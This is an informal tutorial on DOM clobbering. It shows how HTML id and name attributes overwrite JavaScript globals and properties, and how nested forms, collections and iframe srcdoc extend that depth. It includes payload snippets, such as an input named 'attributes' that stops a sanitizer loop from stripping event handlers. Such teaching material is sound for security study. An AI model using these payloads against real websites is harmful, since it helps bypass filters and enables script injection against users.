DOM Clobbering

An attack technique aimed at overwriting global variables and JavaScript references by manipulating DOM elements through name and id attributes, allowing bypasses of validations and security logic.

DOM clobbering is a technique where attackers override JavaScript variables or properties using HTML elements.

Elements with an id or name automatically become global variables that can override expected variables in js code.

Example:

let url = window.currentUrl || 'http://example.com';

If window.currentUrl doesn't exist, an attacker could create:

<a id="currentUrl" href="malicious.com"></a>

Now window.currentUrl will refer to the anchor element.

Global Variables from HTML Elements

Browsers automatically expose elements as globals:

<form id="searchForm"></form>
<script>
searchForm.submit(); // works without getElementById
</script>

id creates a global variable, name creates a global variable and a property on document

<form id="x"></form>
<form name="y"></form>

<script>
alert(x);             // form element
alert(document.x);    // undefined

alert(y);             // form element
alert(document.y);    // form element
</script>

Only some elements support name clobbering: form, iframe, img, image, embed, object

Playing with anchors:

Anchor elements allow controlling the string value via href.

<a id="x" href="1"></a>

<script>
alert(x);        // "1"
alert(typeof x); // object
</script>

DOM Collections (Multiple Elements)

If multiple elements share the same id or name, they form a collection (array-like object).

<a id="x"></a>
<a id="x" name="y" href="1"></a>

<script>
alert(x.y); // "1"
</script>

Or by index:

alert(x[1]); // second element

Anchors only allows 2 levels deep:

x.y

We can increase this depth by using a form:

<form id="x" name="y">
  <input id="z" value="1">
</form>

<script>
alert(x.y.z.value);
</script>

We need to insert the value, otherwise the output of the alert will look like:

"[object HTMLInputElement]"

Advanced: Clobbering with iframes

Iframe allows unlimited depth using : name, srcdoc

<iframe name="foo" srcdoc="<a id='bar' href='1'></a>"></iframe>

<script>
alert(foo.bar); // may be undefined (timing issue)
</script>

Fix: delay rendering

<style>@import 'https://example.com';</style>

Now:

alert(foo.bar); // "1"

Filter Exploitation

DOM clobbering can break security filters, not just control values.

Example:

for (let i = el.attributes.length - 1; i >= 0; i--) {
  if (/^on/i.test(el.attributes[i].name)) {
    el.removeAttribute(el.attributes[i].name);
  }
}

Attack:

<form id="x">
  <input name="attributes">
</form>

attributes will be clobbered, so attributes.length become undefine and the loop will never run.

Other properties that can be clobbered:

  • tagName
  • nodeName
  • parentNode
  • nextSibling, etc.
<form id="x">
  <input name="nodeName">
</form>

<script>
alert(document.getElementById('x').nodeName);
// returns wrong value
</script>

Clobbering getElementById()

Normally document.getElementById('x') will return the first matching element buuuut there's a trick :

<div id="x"></div>  
<body id="x">
getElementById('x') → returns <body>

Here the getElementById will return the body although the <div> was first on the DOM

The same shit will work with querySelector()
